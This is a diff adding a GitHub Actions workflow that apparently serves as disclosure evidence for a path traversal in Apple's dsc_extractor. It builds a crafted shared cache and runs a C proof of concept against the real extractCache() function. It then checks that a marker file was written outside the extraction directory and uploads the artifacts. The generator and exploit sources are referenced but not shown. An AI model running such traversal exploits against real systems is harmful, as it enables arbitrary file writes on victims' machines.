@@ -1,0 +1,114 @@
+name: DSC-EXTRACTOR-TRAVERSAL-1 Real-Target Gate A
+
+# Invokes the ACTUAL dyld_shared_cache_extract_dylibs_progress() from
+# dsc_extractor.bundle — not a reimplementation — to demonstrate CWE-22
+# path traversal in SharedCacheDylibExtractor::extractCache().
+#
+# Gate A: /tmp/poc_dsc_traversal_proof created OUTSIDE extraction dir.
+
+on:
+  workflow_dispatch:
+
+jobs:
+  dsc_real_gate_a:
+    runs-on: macos-latest
+
+    steps:
+      - uses: actions/checkout@v4
+
+      - name: OS and hardware identity
+        run: |
+          sw_vers
+          uname -m
+          system_profiler SPHardwareDataType | grep -E "Model|Processor|Chip" || true
+
+      - name: Xcode environment
+        run: |
+          xcode-select -p
+          xcodebuild -version || true
+          xcrun --show-sdk-path || true
+
+      - name: Locate dsc_extractor.bundle
+        run: |
+          echo "=== Candidate bundle paths ==="
+          for p in \
+            "/Applications/Xcode.app/Contents/Developer/Toolchains/XcodeDefault.xctoolchain/usr/lib/dsc_extractor.bundle" \
+            "/Applications/Xcode.app/Contents/Developer/usr/lib/dsc_extractor.bundle" \
+            "/Library/Developer/CommandLineTools/usr/lib/dsc_extractor.bundle" \
+            "/usr/lib/dsc_extractor.bundle"; do
+            if [ -e "$p" ]; then
+              echo "[FOUND] $p"
+              nm "$p" 2>/dev/null | grep -i "extract_dylib" | head -5 || true
+            else
+              echo "[    ] $p"
+            fi
+          done
+          echo ""
+          echo "=== find scan (Xcode) ==="
+          find /Applications/Xcode.app -name "dsc_extractor.bundle" 2>/dev/null | head -5 || true
+          find /Library/Developer -name "dsc_extractor.bundle" 2>/dev/null | head -5 || true
+
+      - name: Build malicious dyld shared cache
+        run: |
+          python3 gen_malicious_dsc.py malicious_ci.cache
+          echo "=== Cache SHA-256 ==="
+          shasum -a 256 malicious_ci.cache
+          echo "=== Cache header (hex) ==="
+          xxd malicious_ci.cache | head -20
+
+      - name: Build real-target PoC
+        run: |
+          cc -O2 -o dsc_real_poc dsc_real_poc.c
+          echo "[+] Build OK"
+
+      - name: Gate A — pre-run state
+        run: |
+          TRAVERSAL_TARGET="/tmp/poc_dsc_traversal_proof"
+          echo "=== Pre-extraction state ==="
+          if [ -e "$TRAVERSAL_TARGET" ]; then
+            echo "[!] WARNING: traversal target pre-exists — removing"
+            rm -f "$TRAVERSAL_TARGET"
+          fi
+          echo "Traversal target absent: $TRAVERSAL_TARGET"
+
+      - name: Gate A — invoke real extractCache()
+        run: |
+          OUTDIR="$(mktemp -d /tmp/dsc_real_out_XXXXXX)"
+          echo "Extraction directory: $OUTDIR"
+          echo ""
+
+          ./dsc_real_poc malicious_ci.cache "$OUTDIR"
+
+      - name: Gate A — post-run verification
+        run: |
+          TRAVERSAL_TARGET="/tmp/poc_dsc_traversal_proof"
+          echo "=== Post-extraction state ==="
+          if [ -e "$TRAVERSAL_TARGET" ]; then
+            echo "======================================"
+            echo " TRAVERSAL CONFIRMED (Gate A)"
+            echo " Real-target: dyld_shared_cache_extract_dylibs_progress()"
+            echo " Function:    SharedCacheDylibExtractor::extractCache()"
+            echo "======================================"
+            ls -la "$TRAVERSAL_TARGET"
+            echo "Content:"
+            cat "$TRAVERSAL_TARGET"
+          else
+            echo "NOT TRIGGERED — see dsc_real_poc output above for diagnosis"
+            exit 1
+          fi
+
+      - name: Gate D — SHA-256 of PoC artifacts
+        run: |
+          echo "=== Gate D — artifact hashes ==="
+          shasum -a 256 gen_malicious_dsc.py malicious_ci.cache dsc_real_poc.c
+
+      - name: Upload artifacts
+        uses: actions/upload-artifact@v4
+        if: always()
+        with:
+          name: dsc-real-poc-evidence
+          path: |
+            malicious_ci.cache
+            gen_malicious_dsc.py
+            dsc_real_poc.c
+          retention-days: 30
